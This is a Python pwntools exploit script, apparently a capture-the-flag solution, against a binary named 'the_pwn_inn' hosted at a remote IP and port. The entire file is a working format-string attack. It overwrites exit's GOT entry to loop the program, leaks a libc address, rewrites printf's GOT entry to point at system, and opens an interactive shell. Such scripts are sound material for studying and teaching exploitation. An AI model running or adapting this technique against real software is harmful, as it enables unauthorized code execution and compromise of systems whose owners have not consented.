#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./the_pwn_inn')
libc = binary.libc

if args.REMOTE:
	p = remote('185.172.165.118', 2626)
else:
	p = process(binary.path)

offset = 6
payload = fmtstr_payload(offset,{binary.got.exit:binary.sym.vuln})

# inf. free rides
p.sendlineafter('name? \n',payload)
null = payload.find(b'\x00')
log.info('null loc: ' + str(null))
p.recvuntil(payload[null-2:null])

# 2nd pass leak libc
# 0x00007fff902f5278│+0x0038: 0x00007eff1381aebf  →  <printf+175> mov rcx, QWORD PTR [rsp+0x18]
payload = b'%13$p'
p.sendline(payload)
p.recvuntil('Welcome ')
printf_175 = int(p.recvline().strip(),16)
libc.address = printf_175 - libc.sym.printf - 175
log.info('libc.address: ' + hex(libc.address))

payload = fmtstr_payload(offset,{binary.got.printf:libc.sym.system})

p.sendline(payload)
null = payload.find(b'\x00')
log.info('null loc: ' + str(null))
p.recvuntil(payload[null-2:null])
p.interactive()
